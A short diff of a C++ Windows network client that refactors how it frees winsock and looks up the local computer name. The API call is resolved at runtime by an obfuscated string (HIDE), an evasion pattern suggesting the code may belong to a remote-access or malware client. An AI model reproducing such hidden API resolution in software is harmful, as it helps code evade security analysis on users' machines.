@@ -1,6 +1,5 @@
 #include "client.h"
 #include "External/obfuscate.h"
-#include "procutils.h"
 #include "serialization.h"
 
 Client::Client() {
@@ -28,18 +27,15 @@ Client::~Client() {
 	this->Disconnect(); // disconnect incase the socket is still connected
 
 	CleanWSA();
-	ProcessUtilities::FreeUsedLibrary(winsock32);
+	ProcManager.FreeUsedLibrary(winsock32);
 }
 
 void Client::InsertComputerName() {
-	using namespace ProcessUtilities;
 	char  buffer[256];
 	DWORD buffSize = sizeof(buffer);
 
 	// get computer name
-	BOOL success = GetFunctionAddress<PPROCFN::_GetComputerNameA>(
-		GetLoadedLib(freqDLLS::kernel32),
-		std::string(HIDE("GetComputerNameA")))( buffer, &buffSize );
+	BOOL success = ProcManager.GetNative<_GetComputerNameA>((char*)HIDE("GetComputerNameA")).call(buffer, &buffSize);
 
 	if ( success )
 		this->ComputerName = buffer;
